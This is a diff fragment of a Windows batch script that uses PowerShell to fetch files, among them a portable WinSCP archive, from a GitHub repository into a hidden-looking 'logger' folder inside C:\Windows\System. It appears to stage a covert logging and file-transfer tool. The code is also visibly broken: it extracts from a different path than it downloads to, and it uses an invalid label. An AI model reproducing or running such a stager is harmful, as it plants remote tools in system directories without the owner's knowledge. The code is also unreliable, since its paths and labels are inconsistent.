@@ -9,8 +9,7 @@ powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR
 :scp
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System\logger\scp.zip
 powershell Expand-Archive C:\Windows\System32\logger\scp.zip -DestinationPath C:\Windows\System\logger\
-if exist "C:\Windows\System\logger\WinSCP.com" if exist "C:\Windows\System\logger\WinSCP.exe" goto exit
+if exist "C:\Windows\System\logger\WinSCP.com" if exist "C:\Windows\System\logger\WinSCP.exe" goto end
 if not exist "C:\Windows\System\logger\WinSCP.com" goto scp
 if not exist "C:\Windows\System\logger\WinSCP.exe" goto scp
-:exit
-exit
+end:
